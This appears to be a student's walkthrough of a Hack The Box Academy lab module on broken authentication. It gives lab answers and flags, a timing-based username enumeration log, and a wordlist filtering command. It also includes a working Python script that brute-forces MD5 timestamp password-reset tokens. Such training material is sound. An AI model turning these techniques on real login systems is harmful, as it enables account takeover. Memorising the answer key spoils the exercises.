# Broken Authentication
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Broken Authentication
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 2 days
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Default Credentials
### Question:
![](./attachments/Pasted%20image%2020220714094626.png)

*Hint: Look at the page title, and find the relevant list.*

![](./attachments/Pasted%20image%2020220724134517.png)

Google search for `webaccess hmi/scada software default credentials`.

![](./attachments/Pasted%20image%2020220724134636.png)

**Answer:** `advantech`

---
## Weak Bruteforce Protections
### Question 1:
![](./attachments/Pasted%20image%2020220714094738.png)

*Hint: Try to generate some failed login attempts.*

**Answer:** `40`

### Question 2:
![](./attachments/Pasted%20image%2020220714094940.png)

*Hint: This web server doesn't trust your IP!*

![](./attachments/Pasted%20image%2020220724155629.png)

**Answer:** `HTB{127001>31337}`

---
## Bruteforcing Usernames
### Question 1:
![](./attachments/Pasted%20image%2020220714095111.png)

*Hint: Try a short username wordlist from a resource covered in this section.*

![](./attachments/Pasted%20image%2020220725232351.png)

**Answer:** `puppet`

### Question 2:
![](./attachments/Pasted%20image%2020220714095158.png)

*Hint: Read the source of every response.*

![](./attachments/Pasted%20image%2020220725232804.png)

**Answer:** `ansible`

### Question 3:
![](./attachments/Pasted%20image%2020220714095208.png)

*Hint: The timing.py script is a good starting point!*

Make shure we are using `http` and not `https` in the script.

Run multiple times and do an average.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo python3 timing.py ~/seclists/Usernames/top-usernames-shortlist.txt
[-] Checking account root foobar
[+] user root            took 0.169302
[-] Checking account admin foobar
[+] user admin           took 3.220492
[-] Checking account test foobar
[+] user test            took 1.196619
[-] Checking account guest foobar
[+] user guest           took 1.187376
[-] Checking account info foobar
[+] user info            took 1.182451
[-] Checking account adm foobar
[+] user adm             took 0.19524
[-] Checking account mysql foobar
[+] user mysql           took 1.207376
[-] Checking account user foobar
[+] user user            took 0.212822
[-] Checking account administrator foobar
[+] user administrator   took 0.188404
[-] Checking account oracle foobar
[+] user oracle          took 0.175722
[-] Checking account ftp foobar
[+] user ftp             took 0.16328
[-] Checking account pi foobar
[+] user pi              took 1.214804
[-] Checking account puppet foobar
[+] user puppet          took 1.225885
[-] Checking account ansible foobar
[+] user ansible         took 0.200087
[-] Checking account ec2-user foobar
[+] user ec2-user        took 0.215079
[-] Checking account vagrant foobar
[+] user vagrant         took 1.48877
[-] Checking account azureuser foobar
[+] user azureuser       took 3.209391
```

**Answer:** `vagrant`

### Question 4:
![](./attachments/Pasted%20image%2020220714095221.png)

*Hint: Remember that registration forms have differences from login ones.*

**Answer:** `user`

---
## Bruteforcing Passwords
### Question:
![](./attachments/Pasted%20image%2020220714095415.png)

*Hint: Start with a password that has maximum complexity (uppercase, lowercase, digit, special char) and start removing one character family at a time until you identify the password policy.*

The password needs to contain at least one upper case character and a number.

```
┌──(kali㉿kali)-[~]
└─$ grep '[[:upper:]]' seclists/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '^.{2,12}$' | grep '[0-9]' > Downloads/custom_RockYou-50.txt

┌──(kali㉿kali)-[~]
└─$ wc Downloads/custom_RockYou-50.txt                   
 15  15 127 Downloads/custom_RockYou-50.txt
```

The list now contains 15 possible passwords.

![](./attachments/Pasted%20image%2020220726114016.png)

**Answer:** `ANGEL1`

---
## Predictable Reset Token
### Question 1:
![](./attachments/Pasted%20image%2020220714095614.png)

*Hint: Convert the displayed date to epoch time in milliseconds and use it in the script you will create.*

Python script: 
```
#!/usr/bin/python3

from hashlib import md5
import requests
from sys import exit
from time import time

# Change the url to your target / victim
url = "http://<ip-address>:<service-port>/question1/"

# To have a wide window try to bruteforce starting from 1050 seconds ago till 1050 seconds after.
# Change now and username variables as needed. IMPORTANT! the value for now has to be epoch time
# stamp in milliseconds, example 1654627487000 and not epoch timestamp, example 1654627487.

now        = 1654627487000
start_time = now - 1050
end_time   = now + 1050
fail_text  = "Wrong token"
username   = "htbadmin"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, end_time + 1):
    # get token md5
    timestamp = str(x)
    md5_token = md5((username+timestamp).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
```

**Answer:** ``

### Question 2:

**Answer:** ``

---
## Guessable Answers
### Question:
![](./attachments/Pasted%20image%2020220714095705.png)

*Hint: Not all questions are guessable.*

**Answer:** ``

---
## Username Injection
### Question:
![](./attachments/Pasted%20image%2020220714095804.png)

*Hint: Inspect the fields on all pages thoroughly, and try to re-use them.*

**Answer:** ``

---
## Bruteforcing Cookies
### Question 1:
![](./attachments/Pasted%20image%2020220714095910.png)

**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020220714100001.png)

*Hint: Correct decoding is the key.*

**Answer:** ``

---
## Skill Assessment
### Question:
![](./attachments/Pasted%20image%2020220714100046.png)

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]